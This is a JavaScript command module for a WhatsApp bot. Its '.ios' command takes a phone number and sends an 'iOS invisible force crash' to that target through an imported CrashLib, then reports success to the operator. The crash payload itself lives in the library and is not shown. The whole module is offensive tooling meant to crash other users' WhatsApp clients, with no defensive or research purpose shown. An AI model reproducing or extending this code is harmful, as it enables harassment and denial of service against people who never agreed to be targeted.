'use strict';
const { CrashLib } = require('../../lib/crashlib');

module.exports = {
    name: 'ios',
    aliases: ['ioscrash', 'iosforce'],
    category: 'crash',
    desc: 'ɪᴏs ɪɴᴠɪsɪʙʟᴇ ғᴏʀᴄᴇ ᴄʀᴀsʜ',
    usage: '.ios <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const target = args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net' || msg.chat;
        
        let crashLib = global.getCrashLib?.();
        if (!crashLib) {
            crashLib = new CrashLib(sock);
        }
        
        await sock.sendMessage(ctx.from, { text: '💥 sᴇɴᴅɪɴɢ ɪᴏs ᴄʀᴀsʜ...' }, { quoted: msg });
        
        try {
            await crashLib.iosInvisibleForce(target);
            return sock.sendMessage(ctx.from, { text: '✅ ɪᴏs ᴄʀᴀsʜ sᴇɴᴛ ᴛᴏ ' + target }, { quoted: msg });
        } catch (e) {
            return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg });
        }
    }
};